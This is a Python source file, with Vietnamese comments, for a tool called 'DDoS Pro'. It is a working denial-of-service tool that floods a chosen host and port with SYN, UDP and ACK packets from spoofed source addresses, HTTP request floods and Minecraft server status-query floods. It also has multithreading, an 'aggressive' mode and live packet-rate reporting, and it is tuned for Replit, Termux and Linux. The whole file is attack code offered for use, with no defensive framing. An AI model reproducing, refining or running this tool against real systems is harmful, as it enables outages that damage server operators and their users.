#!/usr/bin/env python3
import sys
import os
import multiprocessing
import random
import time
import argparse
import logging
import json
import socket
import struct
import threading
from datetime import datetime
import signal
from concurrent.futures import ThreadPoolExecutor

# Import modules không bắt buộc
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("psutil không được cài đặt. Chạy 'pip install psutil' để cài đặt.")
    
try:
    from scapy.all import IP, TCP, UDP, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Scapy không được cài đặt. Chạy 'pip install scapy' để cài đặt.")

try:
    from mcstatus import JavaServer
    MCSTATUS_AVAILABLE = True
except ImportError:
    MCSTATUS_AVAILABLE = False
    print("mcstatus không được cài đặt. Chạy 'pip install mcstatus' để cài đặt.")

# Script DDoS Pro (SYN, UDP, ACK, HTTP, Query Flood) tối ưu cho Replit/Termux/Linux
# Cách dùng: python3 ddos_pro.py --host <IP> --port <PORT> --processes <QUY_TRÌNH> --duration <GIÂY> [--log <FILE>] [--attack-ratio <SYN:UDP:ACK:HTTP:QUERY>] [--batch-size <SỐ>] [--delay <GIÂY>] [--retry-count <SỐ>] [--max-cpu <PHẦN_TRĂM>] [--config <FILE>]
# Ví dụ: python3 ddos_pro.py --host 127.0.0.1 --port 80 --processes 4 --duration 30 --attack-ratio 30:20:20:20:10 --aggressive

class PacketGenerator:
    """Lớp tạo gói tin cho các loại tấn công"""
    def __init__(self, target_ip, target_port, fake_ips=None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.fake_ips = list(fake_ips) if fake_ips else self.generate_fake_ips(50000)
        
        # Tạo các HTTP payload tùy chỉnh
        self.http_payloads = [
            f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n",
            f"POST /login HTTP/1.1\r\nHost: {self.target_ip}\r\nContent-Length: {random.randint(100, 10000)}\r\n\r\n{'A' * random.randint(100, 5000)}",
            f"HEAD / HTTP/1.1\r\nHost: {self.target_ip}\r\nConnection: keep-alive\r\n\r\n",
            f"GET /?{random.randint(1000, 9999999)} HTTP/1.1\r\nHost: {self.target_ip}\r\nCache-Control: no-cache\r\n\r\n",
            f"GET /search?q={random.randbytes(20).hex()} HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
        ]
    
    def generate_fake_ips(self, count):
        """Tạo danh sách IP giả"""
        return [f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" 
                for _ in range(count)]
    
    def scapy_syn(self):
        """Tạo gói SYN sử dụng Scapy"""
        if not SCAPY_AVAILABLE:
            return None
        try:
            src_ip = random.choice(self.fake_ips)
            src_port = random.randint(1024, 65535)
            return IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000000))
        except Exception as e:
            logging.debug(f"Lỗi tạo gói SYN: {e}")
            return None
    
    def scapy_udp(self):
        """Tạo gói UDP sử dụng Scapy"""
        if not SCAPY_AVAILABLE:
            return None
        try:
            src_ip = random.choice(self.fake_ips)
            src_port = random.randint(1024, 65535)
            return IP(src=src_ip, dst=self.target_ip)/UDP(sport=src_port, dport=self.target_port)
        except Exception as e:
            logging.debug(f"Lỗi tạo gói UDP: {e}")
            return None
    
    def scapy_ack(self):
        """Tạo gói ACK sử dụng Scapy"""
        if not SCAPY_AVAILABLE:
            return None
        try:
            src_ip = random.choice(self.fake_ips)
            src_port = random.randint(1024, 65535)
            return IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="A", seq=random.randint(1000, 9000000), ack=random.randint(1000, 9000000))
        except Exception as e:
            logging.debug(f"Lỗi tạo gói ACK: {e}")
            return None
    
    def socket_syn(self):
        """Gửi gói SYN sử dụng socket thông thường"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            s.settimeout(0.03)  # Timeout ngắn để tối ưu hiệu suất
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.connect_ex((self.target_ip, self.target_port))
            s.close()
            return True
        except:
            return False
    
    def socket_udp(self):
        """Gửi gói UDP sử dụng socket thông thường"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Tạo dữ liệu ngẫu nhiên có kích thước lớn
            data = os.urandom(2048)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
            s.sendto(data, (self.target_ip, self.target_port))
            s.close()
            return True
        except:
            return False
    
    def socket_ack(self):
        """Mô phỏng gói ACK sử dụng socket thông thường"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            s.settimeout(0.03)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            err = s.connect_ex((self.target_ip, self.target_port))
            if err == 0 or err == 10035 or err == 115:  # EWOULDBLOCK/EINPROGRESS
                s.close()
            return True
        except:
            return False
    
    def http_flood(self):
        """Tấn công HTTP flood (Layer 7)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((self.target_ip, self.target_port)) == 0:
                payload = random.choice(self.http_payloads)
                s.send(payload.encode())
                s.close()
                return True
            s.close()
            return False
        except:
            return False

class AttackManager:
    """Quản lý các cuộc tấn công DDoS"""
    def __init__(self, target_ip, target_port, processes, duration, attack_ratio, 
                 batch_size, delay, retry_count, max_cpu, max_workers=20, 
                 is_root=False, aggressive=False, socket_only=True):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.retry_count = max(1, min(retry_count, 5))
        self.max_cpu = max(50, min(max_cpu, 95))
        self.is_root = is_root
        self.aggressive = aggressive
        self.socket_only = socket_only
        self.max_workers = max_workers
        
        # Xác định số quy trình dựa trên CPU
        if PSUTIL_AVAILABLE:
            available_cores = psutil.cpu_count() or 2
            # Nếu chế độ tăng cường, dùng nhiều cores hơn
            if self.aggressive:
                self.processes = min(processes, available_cores * 2)
            else:
                self.processes = min(processes, available_cores)
        else:
            self.processes = min(processes, 6 if self.aggressive else 2)
        
        # Tùy chỉnh batch size dựa vào chế độ
        if self.aggressive:
            self.batch_size = max(200, min(batch_size, 2000))
        else:
            self.batch_size = max(50, min(batch_size, 500))
        
        # Giảm độ trễ trong chế độ tăng cường
        self.delay = max(0, min(delay * (0.5 if aggressive else 1.0), 0.1))
        
        # Counters cho thống kê
        self.packet_count = multiprocessing.Value('i', 0)
        self.syn_count = multiprocessing.Value('i', 0)
        self.udp_count = multiprocessing.Value('i', 0)
        self.ack_count = multiprocessing.Value('i', 0)
        self.http_count = multiprocessing.Value('i', 0)
        self.query_count = multiprocessing.Value('i', 0)
        
        # Tạo IP giả với nhiều địa chỉ hơn trong chế độ tăng cường
        ip_pool_size = 100000 if self.aggressive else 20000
        self.fake_ips = {f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" 
                         for _ in range(ip_pool_size)}
        
        # Tạo packet generator
        self.packet_generator = PacketGenerator(target_ip, target_port, self.fake_ips)
        
        # Phân tích tỷ lệ tấn công
        try:
            ratios = [float(x) for x in attack_ratio.split(":")]
            if len(ratios) != 5 or abs(sum(ratios) - 100) > 0.001:
                raise ValueError
            self.syn_ratio, self.udp_ratio, self.ack_ratio, self.http_ratio, self.query_ratio = [r/100 for r in ratios]
        except ValueError:
            raise ValueError("Tỷ lệ tấn công phải có dạng SYN:UDP:ACK:HTTP:QUERY, tổng=100 (ví dụ: 30:20:20:20:10)")
        
        # Kiểm tra khả năng thực hiện tấn công
        if not SCAPY_AVAILABLE and not socket_only and not is_root:
            logging.warning("Scapy không khả dụng hoặc không có quyền root, sử dụng socket thông thường")
            self.socket_only = True
        
        if not MCSTATUS_AVAILABLE and self.query_ratio > 0:
            logging.warning("mcstatus không khả dụng, query_ratio sẽ được phân bổ lại cho các loại tấn công khác")
            # Phân bổ lại tỷ lệ query cho các loại tấn công khác
            extra = self.query_ratio / 4
            self.syn_ratio += extra
            self.udp_ratio += extra
            self.ack_ratio += extra
            self.http_ratio += extra
            self.query_ratio = 0
    
    def send_packets(self, attack_type):
        """Gửi gói tin dựa vào loại tấn công"""
        success = False
        if attack_type == "syn":
            if self.socket_only:
                success = self.packet_generator.socket_syn()
            else:
                packet = self.packet_generator.scapy_syn()
                if packet and SCAPY_AVAILABLE:
                    try:
                        send(packet, verbose=0)
                        success = True
                    except:
                        success = self.packet_generator.socket_syn()
            if success:
                with self.syn_count.get_lock():
                    self.syn_count.value += 1
                    
        elif attack_type == "udp":
            if self.socket_only:
                success = self.packet_generator.socket_udp()
            else:
                packet = self.packet_generator.scapy_udp()
                if packet and SCAPY_AVAILABLE:
                    try:
                        send(packet, verbose=0)
                        success = True
                    except:
                        success = self.packet_generator.socket_udp()
            if success:
                with self.udp_count.get_lock():
                    self.udp_count.value += 1
                    
        elif attack_type == "ack":
            if self.socket_only:
                success = self.packet_generator.socket_ack()
            else:
                packet = self.packet_generator.scapy_ack()
                if packet and SCAPY_AVAILABLE:
                    try:
                        send(packet, verbose=0)
                        success = True
                    except:
                        success = self.packet_generator.socket_ack()
            if success:
                with self.ack_count.get_lock():
                    self.ack_count.value += 1
                    
        elif attack_type == "http":
            success = self.packet_generator.http_flood()
            if success:
                with self.http_count.get_lock():
                    self.http_count.value += 1
                    
        elif attack_type == "query":
            if MCSTATUS_AVAILABLE:
                try:
                    server = JavaServer(self.target_ip, self.target_port)
                    server.status(timeout=1)
                    with self.query_count.get_lock():
                        self.query_count.value += 1
                    success = True
                except Exception as e:
                    logging.debug(f"Lỗi Query Flood: {e}")
        
        if success:
            with self.packet_count.get_lock():
                self.packet_count.value += 1
                
        return success
    
    def attack_process(self, thread_id, stop_event):
        """Worker gửi các loại tấn công"""
        try:
            # Tạo random generator riêng cho mỗi thread để tránh xung đột
            local_random = random.Random(time.time() + thread_id)
            
            # Vòng lặp tấn công chính
            while not stop_event.is_set():
                success_count = 0
                
                # Kiểm tra CPU nếu có psutil
                if PSUTIL_AVAILABLE and psutil.cpu_percent() > self.max_cpu:
                    logging.debug("CPU vượt ngưỡng, giảm tải...")
                    time.sleep(0.1)
                    continue
                
                # Gửi theo batch để tối ưu hiệu suất
                for _ in range(self.batch_size):
                    r = local_random.random()
                    success = False
                    
                    if r < self.syn_ratio:
                        success = self.send_packets("syn")
                    elif r < self.syn_ratio + self.udp_ratio:
                        success = self.send_packets("udp")
                    elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio:
                        success = self.send_packets("ack")
                    elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio + self.http_ratio:
                        success = self.send_packets("http")
                    else:
                        success = self.send_packets("query")
                    
                    if success:
                        success_count += 1
                
                # Delay nếu cần
                if self.delay > 0:
                    time.sleep(self.delay)
                        
        except Exception as e:
            logging.error(f"Lỗi worker #{thread_id}: {e}")
            
    def multi_thread_attack(self, thread_count, stop_event):
        """Tấn công đa luồng sử dụng ThreadPoolExecutor"""
        try:
            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                # Bắt đầu các luồng tấn công
                futures = []
                for i in range(thread_count):
                    future = executor.submit(self.attack_process, i, stop_event)
                    futures.append(future)
                    logging.info(f"Khởi động luồng tấn công {i+1}/{thread_count}")
                
                # Đợi cho đến khi dừng
                time.sleep(self.duration)
                stop_event.set()
                
                # Đợi tất cả các luồng kết thúc
                for future in futures:
                    try:
                        future.result(timeout=2)
                    except:
                        pass
                        
        except Exception as e:
            logging.error(f"Lỗi tấn công đa luồng: {e}")
    
    def stats_collector(self, stop_event):
        """Thu thập và hiển thị thống kê theo thời gian thực"""
        start_time = time.time()
        last_time = start_time
        last_packet_count = 0
        peak_rate = 0
        total_samples = 0
        total_rate = 0
        
        while not stop_event.is_set():
            try:
                time.sleep(0.5)  # Cập nhật thống kê nhanh hơn
                current_time = time.time()
                time_diff = current_time - last_time
                
                with self.packet_count.get_lock(), self.syn_count.get_lock(), self.udp_count.get_lock(), \
                     self.ack_count.get_lock(), self.http_count.get_lock(), self.query_count.get_lock():
                    
                    current_packet_count = self.packet_count.value
                    syn_count = self.syn_count.value
                    udp_count = self.udp_count.value
                    ack_count = self.ack_count.value
                    http_count = self.http_count.value
                    query_count = self.query_count.value
                    
                    # Tính tốc độ dựa trên thời gian chính xác
                    if time_diff > 0:
                        packet_rate = int((current_packet_count - last_packet_count) / time_diff)
                    else:
                        packet_rate = 0
                    
                    # Cập nhật thống kê
                    peak_rate = max(peak_rate, packet_rate)
                    total_samples += 1
                    total_rate += packet_rate
                    
                    # Cập nhật biến cho lần sau
                    last_packet_count = current_packet_count
                    last_time = current_time
                    
                    elapsed = current_time - start_time
                    
                    # Lấy thông tin hệ thống nếu có psutil
                    if PSUTIL_AVAILABLE:
                        cpu_usage = psutil.cpu_percent()
                        mem_usage = psutil.virtual_memory().percent
                        cpu_info = f"CPU: {cpu_usage:.1f}% | RAM: {mem_usage:.1f}%"
                    else:
                        cpu_info = "CPU/RAM: N/A"
                    
                    # Tính tốc độ trung bình
                    avg_rate = total_rate / total_samples if total_samples > 0 else 0
                    
                    # Thông tin chi tiết từng loại tấn công
                    attack_details = f"SYN: {syn_count} | UDP: {udp_count} | ACK: {ack_count} | HTTP: {http_count} | Query: {query_count}"
                    
                    # Hiển thị thống kê chi tiết
                    logging.info(
                        f"Đã gửi: {current_packet_count:,} gói | "
                        f"Tốc độ: {packet_rate:,} gói/giây | "
                        f"TB: {avg_rate:.1f} | "
                        f"Cao nhất: {peak_rate:,} | "
                        f"{cpu_info} | "
                        f"Thời gian: {elapsed:.1f}s\n{attack_details}"
                    )
            except Exception as e:
                logging.error(f"Lỗi thống kê: {e}")
    
    def run(self):
        """Chạy tấn công DDoS"""
        logging.info(f"Bắt đầu tấn công DDoS Pro đến {self.target_ip}:{self.target_port}")
        logging.info(f"Số quy trình: {self.processes} | Thời gian: {self.duration}s | Batch size: {self.batch_size} | Delay: {self.delay}s | Retry: {self.retry_count}")
        logging.info(f"Tỷ lệ tấn công: SYN={self.syn_ratio*100:.0f}% UDP={self.udp_ratio*100:.0f}% ACK={self.ack_ratio*100:.0f}% HTTP={self.http_ratio*100:.0f}% Query={self.query_ratio*100:.0f}%")
        logging.info(f"Thời điểm: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        logging.info(f"Phương thức: {'Socket trực tiếp' if self.socket_only else 'Scapy + Socket'} | Chế độ: {'Tăng cường' if self.aggressive else 'Thường'}")
        
        # Tạo stop event
        stop_event = threading.Event()
        
        # Khởi động quy trình thống kê
        stats_thread = threading.Thread(target=self.stats_collector, args=(stop_event,))
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            # Khởi động tấn công đa luồng
            attack_thread = threading.Thread(target=self.multi_thread_attack, args=(self.processes, stop_event))
            attack_thread.daemon = True
            attack_thread.start()
            
            # Đợi cho đến khi kết thúc thời gian
            attack_thread.join(timeout=self.duration + 1)
        except KeyboardInterrupt:
            logging.warning("Người dùng dừng chương trình...")
        finally:
            # Dừng tất cả quy trình
            stop_event.set()
            stats_thread.join(timeout=2)
        
        # Báo cáo tổng kết
        with self.packet_count.get_lock(), self.syn_count.get_lock(), self.udp_count.get_lock(), \
             self.ack_count.get_lock(), self.http_count.get_lock(), self.query_count.get_lock():
            
            elapsed = time.time() - start_time if 'start_time' in locals() else self.duration
            packet_rate = self.packet_count.value / self.duration if self.duration > 0 else 0
            
            logging.info(f"Kết thúc! Tổng số gói: {self.packet_count.value:,}")
            logging.info(f"Chi tiết: SYN={self.syn_count.value:,} | UDP={self.udp_count.value:,} | ACK={self.ack_count.value:,} | HTTP={self.http_count.value:,} | Query={self.query_count.value:,}")
            logging.info(f"Tốc độ trung bình: {packet_rate:.1f} gói/giây")
            logging.info(f"Thời điểm kết thúc: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def check_requirements():
    """Kiểm tra yêu cầu hệ thống"""
    is_root = False
    try:
        is_root = os.geteuid() == 0
    except Exception:
        pass
    
    # Trong môi trường Replit, thường không có quyền root
    # Nhưng vẫn có thể sử dụng Scapy với một số giới hạn
    socket_only = True
    
    if PSUTIL_AVAILABLE:
        ram = psutil.virtual_memory().total / (1024**3)
        if ram < 0.5:
            logging.warning("RAM thấp (<0.5GB). Có thể gây crash.")
        if psutil.cpu_count() < 2:
            logging.warning("CPU yếu (<2 core). Hiệu suất sẽ thấp.")
    
    return is_root, socket_only

def load_config(config_file):
    """Tải cấu hình từ file JSON"""
    default_config = {
        "attack_ratio": "30:20:20:20:10",
        "batch_size": 200,
        "delay": 0.005,
        "retry_count": 3,
        "max_cpu": 85,
        "processes": 4,
        "aggressive": True,
        "socket_only": True,
        "max_workers": 20
    }
    
    if config_file and os.path.exists(config_file):
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
            default_config.update(config)
        except Exception as e:
            logging.error(f"Lỗi tải config: {e}")
    
    return default_config

def signal_handler(sig, frame):
    """Xử lý tín hiệu Ctrl+C"""
    logging.info("\n[!] Đang dừng chương trình...")
    sys.exit(0)

def main():
    """Hàm chính"""
    # Xử lý tín hiệu Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Cấu hình CLI
    parser = argparse.ArgumentParser(
        description="DDoS Pro (SYN, UDP, ACK, HTTP, Query Flood) tối ưu hóa hiệu suất cao",
        epilog="Ví dụ: python3 ddos_pro.py --host 127.0.0.1 --port 80 --processes 4 --duration 30 --attack-ratio 30:20:20:20:10 --aggressive"
    )
    parser.add_argument("--host", required=True, help="Địa chỉ IP hoặc tên miền đích")
    parser.add_argument("--port", type=int, required=True, help="Cổng đích (ví dụ: 80, 443)")
    parser.add_argument("--processes", type=int, default=4, help="Số luồng/quy trình (mặc định: 4)")
    parser.add_argument("--duration", type=int, default=60, help="Thời gian tấn công (giây, mặc định: 60)")
    parser.add_argument("--log", help="File log (ví dụ: ddos.log)")
    parser.add_argument("--attack-ratio", default="30:20:20:20:10", help="Tỷ lệ tấn công SYN:UDP:ACK:HTTP:QUERY, tổng=100 (mặc định: 30:20:20:20:10)")
    parser.add_argument("--batch-size", type=int, default=200, help="Số gói mỗi lần gửi (mặc định: 200)")
    parser.add_argument("--delay", type=float, default=0.005, help="Độ trễ giữa các đợt gửi (giây, mặc định: 0.005)")
    parser.add_argument("--retry-count", type=int, default=3, help="Số lần thử lại nếu lỗi gửi (mặc định: 3)")
    parser.add_argument("--max-cpu", type=int, default=85, help="Giới hạn CPU (%, mặc định: 85)")
    parser.add_argument("--max-workers", type=int, default=20, help="Số luồng con tối đa (mặc định: 20)")
    parser.add_argument("--config", help="File cấu hình JSON")
    parser.add_argument("--socket-only", action="store_true", help="Chỉ sử dụng socket thông thường (không cần Scapy)")
    parser.add_argument("--aggressive", "-a", action="store_true", help="Chế độ tấn công tăng cường")
    
    args = parser.parse_args()
    
    # Thiết lập logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler(args.log) if args.log else logging.NullHandler()
        ]
    )
    
    # In banner
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                        DDOS PRO                              ║
║                                                              ║
║  Mục tiêu: {args.host}:{args.port}                     
║  Thời gian: {args.duration} giây | Tiến trình: {args.processes} | {"Chế độ tăng cường" if args.aggressive else "Chế độ thường"}
╚══════════════════════════════════════════════════════════════╝
""")
    
    # Kiểm tra yêu cầu hệ thống
    is_root, socket_only = check_requirements()
    if args.socket_only:
        socket_only = True
    
    # Tải cấu hình (nếu có)
    config = load_config(args.config)
    
    # Nếu một tham số không được chỉ định trong CLI, lấy từ config
    if args.attack_ratio == "30:20:20:20:10" and "attack_ratio" in config:
        args.attack_ratio = config["attack_ratio"]
    if args.batch_size == 200 and "batch_size" in config:
        args.batch_size = config["batch_size"]
    if args.delay == 0.005 and "delay" in config:
        args.delay = config["delay"]
    if args.retry_count == 3 and "retry_count" in config:
        args.retry_count = config["retry_count"]
    if args.max_cpu == 85 and "max_cpu" in config:
        args.max_cpu = config["max_cpu"]
    if args.processes == 4 and "processes" in config:
        args.processes = config["processes"]
    if args.max_workers == 20 and "max_workers" in config:
        args.max_workers = config["max_workers"]
    if not args.aggressive and "aggressive" in config:
        args.aggressive = config["aggressive"]
    if not args.socket_only and "socket_only" in config:
        socket_only = config["socket_only"]
    
    # Biến toàn cục cho thống kê
    start_time = time.time()
    
    try:
        # Tạo và chạy tấn công
        attack = AttackManager(
            target_ip=args.host,
            target_port=args.port,
            processes=args.processes,
            duration=args.duration,
            attack_ratio=args.attack_ratio,
            batch_size=args.batch_size,
            delay=args.delay,
            retry_count=args.retry_count,
            max_cpu=args.max_cpu,
            max_workers=args.max_workers,
            is_root=is_root,
            aggressive=args.aggressive,
            socket_only=socket_only
        )
        attack.run()
    except ValueError as e:
        logging.error(f"Lỗi cấu hình: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        logging.info("\n[!] Ngắt bởi người dùng, đang thoát...")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Lỗi khởi động: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()